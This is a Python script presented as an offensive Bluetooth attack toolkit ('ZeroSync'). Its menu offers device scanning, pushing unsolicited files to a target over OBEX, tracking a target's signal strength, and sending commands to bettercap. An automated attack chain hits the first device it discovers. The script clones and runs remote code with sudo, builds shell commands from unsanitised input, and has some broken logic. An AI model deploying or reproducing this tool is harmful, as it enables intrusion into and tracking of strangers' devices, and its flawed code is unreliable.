#!/usr/bin/env python3

import os
import sys
import time
import threading
import subprocess
from bluetooth import discover_devices, BluetoothSocket
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()
scanned = {}
scanning = False
scan_thread = None
log_file = "zerosync_scanlog.txt"

def scan_devices():
    global scanned, scanning
    scanning = True
    scanned.clear()
    console.print("[bold yellow]Scanning for Bluetooth devices... (Press Stop to cancel)[/bold yellow]")
    while scanning:
        try:
            nearby = discover_devices(lookup_names=True)
            for addr, name in nearby:
                if addr not in scanned:
                    scanned[addr] = name
                    console.print(f"[green][+] {addr} - {name}[/green]")
                    with open(log_file, "a") as log:
                        log.write(f"{addr} - {name}\n")
            time.sleep(4)
        except Exception as e:
            console.print(f"[red]Scan error:[/red] {e}")
            break

def start_scan_thread():
    global scan_thread, scanning
    if not scanning:
        scan_thread = threading.Thread(target=scan_devices, name="scan_devices", daemon=True)
        scan_thread.start()
    else:
        console.print("[red]Scan already running.[/red]")

def stop_scan():
    global scanning
    if scanning:
        scanning = False
        console.print("[bold red]Scanning stopped.[/bold red]")
    else:
        console.print("[yellow]No active scan to stop.[/yellow]")

def show_scanned_devices():
    if not scanned:
        console.print("[bold red]No devices scanned yet.[/bold red]")
        return
    table = Table(title="Scanned Devices")
    table.add_column("Address", style="cyan")
    table.add_column("Name", style="magenta")
    for addr, name in scanned.items():
        table.add_row(addr, name)
    console.print(table)

def blueborne_scanner():
    console.print("[bold green]Launching BlueBorne scan...[/bold green]")
    os.system("git clone https://github.com/evilsocket/btlejack 2>/dev/null || true")
    os.system("cd btlejack && sudo python3 blueborne-detector.py")

def obex_file_bomb():
    addr = Prompt.ask("[bold cyan]Target Bluetooth Address[/bold cyan]")
    file_path = Prompt.ask("[bold cyan]Path to file to send[/bold cyan]")
    console.print("[yellow]Sending file via OBEX...[/yellow]")
    os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {addr} --channel 9 -p '{file_path}'")

def signal_strength_tracker():
    addr = Prompt.ask("[bold cyan]Target Bluetooth Address[/bold cyan]")
    console.print(f"[bold]Tracking signal strength for {addr}...[/bold]")
    for _ in range(10):
        try:
            out = subprocess.check_output(["hcitool", "rssi", addr]).decode()
            console.print(f"[green]{out.strip()}[/green]")
        except:
            console.print("[red]Failed to read RSSI[/red]")
        time.sleep(2)

def bettercap_ble_attack():
    cmd = Prompt.ask("[bold cyan]Enter Bettercap BLE command[/bold cyan]")
    os.system(f"echo '{cmd}' | sudo bettercap -eval")

def auto_attack_chain():
    console.print("[bold red]Running automated attack chain...[/bold red]")
    start_scan_thread()
    time.sleep(5)
    stop_scan()
    show_scanned_devices()
    if scanned:
        target = list(scanned.keys())[0]
        console.print(f"[yellow]Auto-selecting target:[/yellow] {target}")
        signal_strength_tracker()
        obex_file_bomb()
        bettercap_ble_attack()
    else:
        console.print("[red]No devices to auto-attack[/red]")

def banner():
    panel = Panel.fit(
        "[bold magenta]ZeroSync v4.5[/bold magenta]\n[green]Bluetooth Attack Toolkit[/green]\n[yellow]Created by Null_Lyfe[/yellow]",
        title="🔧 ZeroSync",
        border_style="cyan"
    )
    console.print(panel)

def main_menu():
    while True:
        banner()
        table = Table(title="Attack Modules")
        table.add_column("Option", style="bold green")
        table.add_column("Attack Module", style="bold yellow")
        table.add_row("1", "🔍 Scan Devices")
        table.add_row("2", "🛑 Stop Scanning")
        table.add_row("3", "📜 Show Devices")
        table.add_row("4", "🧠 BlueBorne Scan")
        table.add_row("5", "📤 OBEX File Bomb")
        table.add_row("6", "📶 Signal Strength Tracker")
        table.add_row("7", "🎯 Bettercap BLE Command")
        table.add_row("8", "⚔️ Auto Attack Chain")
        table.add_row("9", "❌ Exit")
        console.print(table)
        try:
            choice = Prompt.ask("[bold cyan]Select Option[/bold cyan]")
            if choice == "1":
                start_scan_thread()
            elif choice == "2":
                stop_scan()
            elif choice == "3":
                show_scanned_devices()
            elif choice == "4":
                blueborne_scanner()
            elif choice == "5":
                obex_file_bomb()
            elif choice == "6":
                signal_strength_tracker()
            elif choice == "7":
                bettercap_ble_attack()
            elif choice == "8":
                auto_attack_chain()
            elif choice == "9":
                stop_scan()
                console.print("[bold red]Exiting ZeroSync...[/bold red]")
                break
            else:
                console.print("[red]Invalid selection[/red]")
        except KeyboardInterrupt:
            stop_scan()
            break

if __name__ == "__main__":
    main_menu()
